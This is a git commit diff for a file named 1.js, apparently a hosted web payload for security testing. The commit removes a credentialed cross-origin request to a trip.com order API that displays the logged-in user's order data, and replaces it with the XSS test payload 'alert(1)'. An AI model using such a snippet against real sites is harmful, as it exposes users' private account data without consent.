c9299beba1102c01ced8d8d2c3f53705de269c41
海贝 <52484629+Sea8ye@users.noreply.github.com>
2024-02-18 11:12:06 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,7 +1,1 @@
-const xhr = new XMLHttpRequest();
-xhr.onload = function(){
- document.getElementById("demo").innerHTML= alert(this.responseText);
-};
-xhr.open('GET', 'https://www.trip.com/restapi/soa2/10098/GetOrderWithBM.json',true);
-xhr.withCredentials= true;
-xhr.send();
+alert(1);
